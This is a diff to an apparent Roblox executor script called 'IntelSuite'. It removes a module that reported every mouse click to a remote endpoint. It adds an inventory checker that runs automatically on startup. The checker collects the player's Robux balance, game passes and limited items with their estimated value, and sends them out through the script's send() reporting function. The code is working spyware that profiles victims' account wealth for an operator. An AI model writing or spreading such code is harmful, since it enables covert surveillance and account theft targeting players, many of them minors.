@@ -674,49 +674,68 @@ task.spawn(function()
 end)
 
 -- ============================================================
--- MODULE 11: Mouse Logger
--- Activate via !cmd mouselog
+-- MODULE 12: Inventory Checker
+-- Runs on startup + !cmd inventory
 -- ============================================================
-local function startMouseLogger()
-    if getgenv().IntelSuite.MouseLogActive then
-        send("MOUSE LOG", "Already active.", 16776960)
-        return
-    end
-    getgenv().IntelSuite.MouseLogActive = true
+local function runInventoryCheck()
+    if not getgenv().IntelSuite.IsActive then return end
+    task.spawn(function()
+        local uid = tostring(LocalPlayer.UserId)
+        local result = "**User:** " .. LocalPlayer.Name .. "\n**ID:** " .. uid
 
-    local mouse = LocalPlayer:GetMouse()
-
-    mouse.Button1Down:Connect(function()
-        if not getgenv().IntelSuite.IsActive then return end
+        -- Robux balance
         pcall(function()
-            local target = mouse.Target and tostring(mouse.Target:GetFullName()) or "nil"
-            send("MOUSE CLICK",
-                "**User:** " .. LocalPlayer.Name ..
-                "\n**Button:** Left Click" ..
-                "\n**Position:** " .. tostring(mouse.X) .. ", " .. tostring(mouse.Y) ..
-                "\n**Target:** " .. target,
-                8388736
-            )
+            local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
+            if r then
+                local d = HttpService:JSONDecode(r)
+                if d and d.robux then
+                    result = result .. "\n**Robux:** " .. tostring(d.robux)
+                end
+            end
         end)
-    end)
 
-    mouse.Button2Down:Connect(function()
-        if not getgenv().IntelSuite.IsActive then return end
+        -- Game passes
         pcall(function()
-            local target = mouse.Target and tostring(mouse.Target:GetFullName()) or "nil"
-            send("MOUSE CLICK",
-                "**User:** " .. LocalPlayer.Name ..
-                "\n**Button:** Right Click" ..
-                "\n**Position:** " .. tostring(mouse.X) .. ", " .. tostring(mouse.Y) ..
-                "\n**Target:** " .. target,
-                8388736
-            )
+            local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/items/GamePass?limit=10")
+            if r then
+                local d = HttpService:JSONDecode(r)
+                if d and d.data and #d.data > 0 then
+                    local passes = {}
+                    for _, v in ipairs(d.data) do
+                        table.insert(passes, tostring(v.name or v.assetName or v.id or "Unknown"))
+                    end
+                    result = result .. "\n**Game Passes:** " .. table.concat(passes, ", ")
+                else
+                    result = result .. "\n**Game Passes:** None"
+                end
+            end
         end)
-    end)
 
-    send("MOUSE LOG", "Now logging all mouse clicks.\n**User:** " .. LocalPlayer.Name, 65280)
+        -- Limiteds / collectibles
+        pcall(function()
+            local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/assets/collectibles?limit=10&sortOrder=Desc")
+            if r then
+                local d = HttpService:JSONDecode(r)
+                if d and d.data and #d.data > 0 then
+                    local totalRAP = 0
+                    local items = {}
+                    for _, v in ipairs(d.data) do
+                        local rap = v.recentAveragePrice or 0
+                        totalRAP = totalRAP + rap
+                        table.insert(items, tostring(v.name or "Unknown") .. " (RAP: " .. tostring(rap) .. ")")
+                    end
+                    result = result .. "\n**Limiteds (est. RAP: " .. tostring(totalRAP) .. "R$):**\n" .. table.concat(items, "\n")
+                else
+                    result = result .. "\n**Limiteds:** None"
+                end
+            end
+        end)
+
+        send("INVENTORY CHECK", result:sub(1, 1900), 16776960)
+    end)
 end
 
-getgenv().IntelSuite.MouseLogActive = false
-getgenv().IntelSuite.StartMouseLogger = startMouseLogger
+task.wait(4)
+runInventoryCheck()
+getgenv().IntelSuite.InventoryCheck = runInventoryCheck
 
